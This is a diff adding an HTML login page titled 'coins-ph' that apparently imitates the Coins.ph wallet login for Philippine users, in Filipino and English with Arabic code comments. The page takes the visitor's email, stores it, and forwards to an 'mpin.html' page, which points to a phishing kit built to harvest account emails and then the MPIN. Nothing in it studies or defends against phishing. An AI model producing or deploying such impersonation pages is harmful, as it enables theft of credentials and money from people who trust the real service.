@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="tl" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>coins-ph</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #ffffff; display: flex; justify-content: center; padding: 20px; }
+        .login-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        
+        /* زر اللغة */
+        .lang-btn { background: #eee; border: 1px solid #ccc; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold; }
+        
+        .help-icon { border: 2px solid #333; border-radius: 50%; width: 22px; height: 22px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 14px; }
+        .title-section { text-align: center; margin-bottom: 30px; }
+        .title-section h1 { font-size: 18px; }
+        .country { color: #8e8e8e; font-size: 14px; margin-top: 5px; }
+        .tabs { display: flex; margin-bottom: 25px; border-bottom: 1px solid #f0f0f0; }
+        .tab { padding-bottom: 10px; font-size: 18px; font-weight: 600; color: #000; border-bottom: 3px solid #000; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 14px; color: #8e8e8e; margin-bottom: 8px; }
+        .input-field { width: 100%; padding: 15px; border: 1.5px solid #333; border-radius: 8px; font-size: 16px; outline: none; }
+        .btn-next { width: 100%; padding: 15px; background-color: #f1f3f5; border: none; border-radius: 8px; color: #adb5bd; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        .btn-next.enabled { background-color: #000; color: #fff; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <button class="lang-btn" id="langBtn">English</button>
+            <div class="help-icon">?</div>
+        </div>
+        <div class="title-section">
+            <h1 id="txt-login">Mag-log in</h1>
+            <div class="country">🇵🇭 Philippines</div>
+        </div>
+        <div class="tabs"><div class="tab" id="txt-tab">Email</div></div>
+        <div class="form-group">
+            <label id="txt-label">Email address</label>
+            <input type="email" id="emailInput" class="input-field" placeholder="Email address">
+        </div>
+        <button id="nextBtn" class="btn-next" disabled>Susunod</button>
+    </div>
+
+    <script>
+        const langBtn = document.getElementById('langBtn');
+        const emailInput = document.getElementById('emailInput');
+        const nextBtn = document.getElementById('nextBtn');
+
+        // نصوص الترجمة
+        const translations = {
+            tl: { login: "Mag-log in", label: "Email address", next: "Susunod", switch: "English" },
+            en: { login: "Log in", label: "Email address", next: "Next", switch: "Filipino" }
+        };
+
+        let currentLang = localStorage.getItem('lang') || 'tl';
+
+        function updateLang() {
+            const t = translations[currentLang];
+            document.getElementById('txt-login').innerText = t.login;
+            document.getElementById('txt-label').innerText = t.label;
+            nextBtn.innerText = t.next;
+            langBtn.innerText = t.switch;
+            localStorage.setItem('lang', currentLang);
+        }
+
+        langBtn.addEventListener('click', () => {
+            currentLang = currentLang === 'tl' ? 'en' : 'tl';
+            updateLang();
+        });
+
+        emailInput.addEventListener('input', () => {
+            if (emailInput.value.trim().length > 0) {
+                nextBtn.classList.add('enabled');
+                nextBtn.disabled = false;
+            } else {
+                nextBtn.classList.remove('enabled');
+                nextBtn.disabled = true;
+            }
+        });
+
+        nextBtn.addEventListener('click', () => {
+            localStorage.setItem('userEmail', emailInput.value);
+            window.location.href = 'mpin.html'; 
+        });
+
+        updateLang(); // تشغيل اللغة عند الفتح
+    </script>
+</body>
+</html>
